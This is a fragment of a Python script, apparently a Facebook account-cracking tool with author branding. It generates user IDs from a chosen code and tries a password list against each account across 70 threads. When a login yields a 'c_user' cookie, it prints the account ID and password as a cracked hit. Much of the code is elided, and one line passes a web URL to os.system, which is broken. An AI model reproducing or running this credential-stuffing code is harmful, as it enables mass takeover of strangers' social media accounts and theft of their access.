...
def riaz():
	...
	if riaz1 =='4':
		os.system('https://www.facebook.com/doran.khh?mibextid=ZbWKwL');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    print('\x1b[1;91m[+] BROTHERS : DADAX NAIB SODHAIR HAMZA ')
    lines()
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m BROTHERS DADAX NAIB SHODAIR HAMZA')
        lines()
        for guru in user:
            uid = kode+guru
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[DADAX-CP] '+cid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.DADAX\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
